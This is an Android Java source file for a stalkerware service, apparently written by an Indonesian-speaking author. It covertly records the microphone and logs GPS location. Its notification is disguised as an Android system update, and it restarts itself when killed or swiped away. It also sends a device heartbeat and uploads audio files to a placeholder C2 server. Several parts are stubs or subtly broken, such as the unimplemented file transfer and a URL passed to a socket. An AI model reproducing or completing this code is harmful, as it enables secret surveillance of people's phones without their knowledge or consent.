package com.nullx.pp;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ServiceInfo;
import android.graphics.Color;
import android.hardware.Sensor;
import android.hardware.SensorEvent;
import android.hardware.SensorEventListener;
import android.hardware.SensorManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.media.AudioFormat;
import android.media.AudioRecord;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Bundle;
import android.os.IBinder;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;

import androidx.core.app.NotificationCompat;

import java.io.DataOutputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.List;
import java.util.Locale;
import java.util.Timer;
import java.util.TimerTask;

public class SpyService extends Service implements SensorEventListener, LocationListener {
    private static final String TAG = "X.SpyService";
    private static final String CHANNEL_ID = "SysCoreChannel";
    private static final int NOTIFICATION_ID = 9999;
    
    private SensorManager sensorManager;
    private LocationManager locationManager;
    private AudioRecord audioRecord;
    private Timer timer;
    private PowerManager.WakeLock wakeLock;
    private static boolean isRunning = false;
    
    // Server C2 (ubah sesuai server lo)
    private static final String C2_SERVER = "http://your-c2-server.com/api";
    private static final int HEARTBEAT_INTERVAL = 5000; // 5 detik

    @Override
    public void onCreate() {
        super.onCreate();
        Log.i(TAG, "[✓] SpyService onCreate");
        createNotificationChannel();
        acquireWakeLock();
        isRunning = true;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.i(TAG, "[✓] SpyService started - PERSISTENT MODE ACTIVE");
        
        // Foreground Service dengan semua izin
        if (Build.VERSION.SDK_INT >= 34) {
            startForeground(NOTIFICATION_ID, getStealthNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PLAYBACK |
                ServiceInfo.FOREGROUND_SERVICE_TYPE_SPECIAL_USE);
        } else if (Build.VERSION.SDK_INT >= 29) {
            startForeground(NOTIFICATION_ID, getStealthNotification(),
                ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE | 
                ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION);
        } else {
            startForeground(NOTIFICATION_ID, getStealthNotification());
        }
        
        // Start semua modul
        startSensors();
        startLocationTracking();
        startMicrophoneRecording();
        startHeartbeat();
        
        // Anti-kill: pantau status memory
        monitorServiceStatus();
        
        return START_STICKY; // Auto restart kalo mati
    }
    
    private void monitorServiceStatus() {
        new Timer().scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                if (!isRunning) {
                    Log.w(TAG, "[!] Service mati, restarting...");
                    restartService();
                }
            }
        }, 10000, 10000);
    }
    
    private void restartService() {
        isRunning = true;
        startSensors();
        startLocationTracking();
        startMicrophoneRecording();
    }
    
    private Notification getStealthNotification() {
        // Notifikasi menyamar jadi update sistem
        NotificationCompat.Builder builder = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle("Android System Intelligence")
                .setContentText("Updating core components...")
                .setSmallIcon(android.R.drawable.ic_menu_report_image)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setCategory(Notification.CATEGORY_SERVICE)
                .setOngoing(true)
                .setSilent(true)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET);
        
        // Android 13+ tetep samar
        if (Build.VERSION.SDK_INT >= 33) {
            builder.setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE);
        }
        
        return builder.build();
    }
    
    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= 26) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "System Core Engine",
                    NotificationManager.IMPORTANCE_LOW
            );
            channel.setShowBadge(false);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            channel.setSound(null, null);
            
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }
    
    private void acquireWakeLock() {
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "SpyService:WakeLock");
        wakeLock.setReferenceCounted(false);
        wakeLock.acquire(10*60*1000L); // 10 menit
    }
    
    private void startSensors() {
        sensorManager = (SensorManager) getSystemService(SENSOR_SERVICE);
        Sensor accelerometer = sensorManager.getDefaultSensor(Sensor.TYPE_ACCELEROMETER);
        if (accelerometer != null) {
            sensorManager.registerListener(this, accelerometer, SensorManager.SENSOR_DELAY_NORMAL);
        }
    }
    
    private void startLocationTracking() {
        try {
            locationManager = (LocationManager) getSystemService(LOCATION_SERVICE);
            if (locationManager != null) {
                // Cek permission dulu
                if (checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED) {
                    if (locationManager.isProviderEnabled(LocationManager.GPS_PROVIDER)) {
                        locationManager.requestLocationUpdates(LocationManager.GPS_PROVIDER, 3000, 0, this);
                    } else {
                        locationManager.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 3000, 0, this);
                    }
                } else {
                    Log.e(TAG, "Location permission not granted");
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Location permission error: " + e.getMessage());
        }
    }
    
    private void startMicrophoneRecording() {
        int bufferSize = AudioRecord.getMinBufferSize(44100, 
                AudioFormat.CHANNEL_IN_MONO, 
                AudioFormat.ENCODING_PCM_16BIT);
        
        audioRecord = new AudioRecord(MediaRecorder.AudioSource.MIC, 44100,
                AudioFormat.CHANNEL_IN_MONO,
                AudioFormat.ENCODING_PCM_16BIT, bufferSize);
        
        if (audioRecord.getState() == AudioRecord.STATE_INITIALIZED) {
            audioRecord.startRecording();
            
            // Record loop setiap 10 detik
            new Timer().scheduleAtFixedRate(new TimerTask() {
                @Override
                public void run() {
                    if (audioRecord != null && audioRecord.getRecordingState() == AudioRecord.RECORDSTATE_RECORDING) {
                        byte[] buffer = new byte[bufferSize];
                        int read = audioRecord.read(buffer, 0, buffer.length);
                        if (read > 0) {
                            saveAudioData(buffer, read);
                        }
                    }
                }
            }, 0, 10000);
        }
    }
    
    private void saveAudioData(byte[] data, int length) {
        try {
            File audioFile = new File(getFilesDir(), "aud_" + System.currentTimeMillis() + ".raw");
            FileOutputStream fos = new FileOutputStream(audioFile, true);
            fos.write(data, 0, length);
            fos.close();
            
            // Kirim ke server (opsional)
            sendToServer(audioFile);
        } catch (Exception e) {
            Log.e(TAG, "Save audio error: " + e.getMessage());
        }
    }
    
    private void startHeartbeat() {
        timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            @Override
            public void run() {
                sendHeartbeat();
            }
        }, 0, HEARTBEAT_INTERVAL);
    }
    
    private void sendHeartbeat() {
        try {
            // Kirim data device info
            String deviceInfo = String.format(Locale.US,
                "{device:\"%s\",android:%d,batt:%d,mem:%d}",
                Build.MODEL,
                Build.VERSION.SDK_INT,
                getBatteryLevel(),
                getAvailableMemory()
            );
            
            // Kirim via HTTP ke C2
            // (implementasi pake OkHttp atau koneksi raw)
            Log.i(TAG, "Heartbeat: " + deviceInfo);
        } catch (Exception e) {
            Log.e(TAG, "Heartbeat error: " + e.getMessage());
        }
    }
    
    private int getBatteryLevel() {
        // Implementasi ambil battery level
        return 75; // placeholder
    }
    
    private long getAvailableMemory() {
        Runtime runtime = Runtime.getRuntime();
        return runtime.freeMemory() / (1024 * 1024);
    }
    
    private void sendToServer(File file) {
        // Kirim file ke server C2
        try {
            Socket socket = new Socket(C2_SERVER, 8080);
            OutputStream os = socket.getOutputStream();
            DataOutputStream dos = new DataOutputStream(os);
            
            dos.writeUTF(file.getName());
            dos.writeLong(file.length());
            
            // Baca file dan kirim
            // ... implementasi file transfer
            
            dos.close();
            socket.close();
        } catch (Exception e) {
            Log.e(TAG, "Send to server error: " + e.getMessage());
        }
    }
    
    @Override
    public void onSensorChanged(SensorEvent event) {
        if (event.sensor.getType() == Sensor.TYPE_ACCELEROMETER) {
            float x = event.values[0];
            float y = event.values[1];
            float z = event.values[2];
            
            // Detect device movement
            if (Math.abs(x) > 15 || Math.abs(y) > 15 || Math.abs(z) > 15) {
                Log.d(TAG, "Device moved significantly!");
            }
        }
    }
    
    // ==================== LOCATION LISTENER METHODS (FIXED) ====================
    
    @Override
    public void onLocationChanged(Location location) {
        if (location == null) return;
        
        String locData = String.format(Locale.US, 
            "lat:%f,lng:%f,acc:%f,time:%d",
            location.getLatitude(),
            location.getLongitude(),
            location.getAccuracy(),
            location.getTime()
        );
        Log.i(TAG, "Location: " + locData);
        
        // Simpan lokasi
        try {
            File locFile = new File(getFilesDir(), "location.log");
            FileOutputStream fos = new FileOutputStream(locFile, true);
            fos.write((locData + "\n").getBytes());
            fos.close();
        } catch (Exception e) {
            Log.e(TAG, "Save location error");
        }
    }
    
    // Untuk Android 10+ (API 29)
    @Override
    public void onLocationChanged(List<Location> locations) {
        if (locations != null && !locations.isEmpty()) {
            onLocationChanged(locations.get(0));
        }
    }
    
    @Override
    public void onFlushComplete(int requestCode) {
        // Required for newer LocationListener API
    }
    
    @Override
    public void onStatusChanged(String provider, int status, Bundle extras) {
        // Deprecated but required for compatibility
    }
    
    @Override
    public void onProviderEnabled(String provider) {
        // Not needed
    }
    
    @Override
    public void onProviderDisabled(String provider) {
        // Not needed
    }
    
    // ==================== SENSOR LISTENER METHODS ====================
    
    @Override
    public void onAccuracyChanged(Sensor sensor, int accuracy) {
        // Not needed
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    
    @Override
    public void onDestroy() {
        Log.w(TAG, "[!] SpyService onDestroy - triggering restart");
        isRunning = false;
        
        // Broadcast ke RestarterReceiver
        Intent restartIntent = new Intent("RestartSpyService");
        restartIntent.setClass(this, RestarterReceiver.class);
        sendBroadcast(restartIntent);
        
        // Release resource
        if (sensorManager != null) sensorManager.unregisterListener(this);
        if (locationManager != null) locationManager.removeUpdates(this);
        if (audioRecord != null) {
            audioRecord.stop();
            audioRecord.release();
        }
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        
        super.onDestroy();
    }
    
    @Override
    public void onTaskRemoved(Intent rootIntent) {
        Log.w(TAG, "[!] App di-swipe, restarting service...");
        
        // Proteksi: langsung restart
        Intent restartServiceIntent = new Intent(getApplicationContext(), SpyService.class);
        restartServiceIntent.setPackage(getPackageName());
        
        if (Build.VERSION.SDK_INT >= 31) {
            startForegroundService(restartServiceIntent);
        } else {
            startService(restartServiceIntent);
        }
        
        super.onTaskRemoved(rootIntent);
    }
}